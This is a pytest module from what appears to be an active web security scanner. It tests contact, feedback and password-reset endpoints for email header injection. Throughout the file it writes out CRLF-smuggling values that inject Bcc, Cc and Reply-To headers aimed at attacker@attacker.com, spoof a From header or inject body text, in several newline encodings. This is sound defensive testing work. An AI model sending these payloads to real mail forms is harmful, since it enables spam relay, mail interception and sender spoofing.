"""Category 38: Email Header Injection — CRLF in email parameters."""
import re
import pytest

from tests.active.helpers import safe_post, url_join
from tests.active.config import TARGET_URL

EMAIL_ENDPOINTS = [
    "/contact", "/api/contact", "/feedback", "/support",
    "/forgot-password", "/reset-password", "/subscribe",
    "/api/email", "/send-message", "/notify",
]

CRLF_PAYLOAD = "victim@example.com%0aBcc:%20attacker@attacker.com"
CRLF_PATTERNS = {
    "bcc": "Bcc:%20attacker@attacker.com",
    "cc": "Cc:%20attacker@attacker.com",
    "reply-to": "Reply-To:%20attacker@attacker.com",
}


class TestEmailHeaderInjectionCrlf:
    def test_email_header_injection_bcc(self):
        """Test email header injection via BCC parameter."""
        for endpoint in EMAIL_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          data={
                              "email": "victim@example.com%0aBcc:%20attacker@attacker.com",
                              "message": "test"
                          },
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Email header injection candidate at {endpoint}: "
                    "CRLF in email parameter may allow BCC injection"
                )

    def test_email_header_injection_cc(self):
        """Test email header injection via CC parameter."""
        for endpoint in EMAIL_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          data={
                              "to": "victim@example.com%0aCc:%20attacker@attacker.com",
                              "subject": "test",
                              "body": "message"
                          },
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"CC injection candidate at {endpoint}: "
                    "CRLF allows CC header injection"
                )


class TestEmailHeaderInjectionSubject:
    def test_subject_injection(self):
        """Test email header injection via Subject parameter."""
        for endpoint in EMAIL_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          data={
                              "to": "victim@example.com",
                              "subject": "Hello%0aX-Injected-Header:%20Malicious",
                              "body": "test"
                          },
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Subject header injection at {endpoint}: "
                    "CRLF in subject allows custom header injection"
                )


class TestEmailHeaderInjectionFrom:
    def test_from_header_spoofing(self):
        """Test email spoofing via From header injection."""
        for endpoint in EMAIL_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          data={
                              "from": "attacker@attacker.com%0aReply-To:%20attacker@attacker.com",
                              "to": "victim@example.com",
                              "message": "test"
                          },
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"From header spoofing at {endpoint}: "
                    "can inject Reply-To via From parameter"
                )


class TestEmailBodyInjection:
    def test_email_body_injection_via_headers(self):
        """Test email body injection via header manipulation."""
        for endpoint in EMAIL_ENDPOINTS:
            # CRLF twice to get to email body
            payload = "test%0a%0aInjected Body Content Here"
            r = safe_post(url_join(endpoint),
                          data={
                              "to": "victim@example.com",
                              "subject": "Subject",
                              "body": payload
                          },
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Email body injection at {endpoint}: "
                    "CRLF allows body content injection"
                )


class TestEmailHeaderNewlineVariations:
    def test_crlf_variations(self):
        """Test different newline encodings for CRLF injection."""
        for endpoint in EMAIL_ENDPOINTS:
            newline_patterns = [
                "%0d%0a",  # CRLF
                "%0a",     # LF
                "%0d",     # CR
                "%0a%0d",  # LFCR
            ]
            
            for newline in newline_patterns:
                r = safe_post(url_join(endpoint),
                              data={
                                  "to": f"victim@example.com{newline}Bcc:%20attacker@example.com",
                                  "message": "test"
                              },
                              allow_redirects=False)
                if r and r.status_code in (200, 201):
                    pytest.skip(
                        f"Email injection with {newline} at {endpoint}: "
                        "newline encoding allows header injection"
                    )


class TestEmailInjectionViaApiParams:
    def test_api_email_injection(self):
        """Test email injection in JSON API endpoints."""
        for endpoint in EMAIL_ENDPOINTS:
            r = safe_post(url_join(endpoint),
                          json={
                              "recipient": "victim@example.com\r\nBcc: attacker@attacker.com",
                              "message": "test"
                          },
                          headers={"Content-Type": "application/json"},
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"JSON API email injection at {endpoint}: "
                    "CRLF in JSON body allows header injection"
                )


class TestEmailInjectionSkipped:
    def test_email_injection_verification_requires_monitoring(self):
        pytest.skip(
            "Email header injection verification requires: "
            "1) Monitoring actual emails sent (email account access) "
            "2) Checking mail server logs "
            "3) Analyzing raw email headers. "
            "Passive testing can only detect potential injection points. "
            "Verify with email account or mail server access."
        )
